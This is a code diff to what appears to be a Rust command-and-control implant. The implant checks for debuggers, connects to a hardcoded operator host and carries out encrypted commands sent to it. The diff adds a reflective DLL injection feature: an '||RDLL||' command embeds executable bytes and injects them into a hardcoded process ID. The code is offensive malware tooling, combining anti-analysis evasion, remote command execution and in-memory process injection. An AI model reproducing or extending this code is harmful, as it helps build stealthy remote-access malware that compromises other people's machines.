@@ -12,6 +12,7 @@ use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret};
 use rand::rngs::OsRng;
 mod utils;
 mod sandbox;
+mod rdll;
 
 use utils::ImportedScript;
 
@@ -36,7 +37,7 @@ fn main() {
     #[cfg(windows)]
     sandbox::check_debugger();
 
-    let mut host = "127.0.0.1".to_string();
+    let mut host = "192.168.183.1".to_string();
     let mut port = "8080".to_string();
     let mut imported_scripts: HashMap<String, ImportedScript> = HashMap::new();
 
@@ -120,6 +121,14 @@ fn main() {
                         }
                     } else if command.starts_with("||RUNSCRIPT||") {
                         utils::handle_run_script(&mut stream, &command, &imported_scripts, shared_secret);
+                    } else if command.starts_with("||RDLL||") 
+                    {
+                        #[cfg(windows)]
+                        let target_pid = 6372;
+                        #[cfg(windows)]
+                        let dll_bytes: &[u8] = include_bytes!("test.exe");
+                        #[cfg(windows)]
+                        rdll::reflective_inject(&mut stream, target_pid, dll_bytes, shared_secret);
                     } else if command_clone.starts_with("||EXIT||") {
                         exit(1);
                     } else {
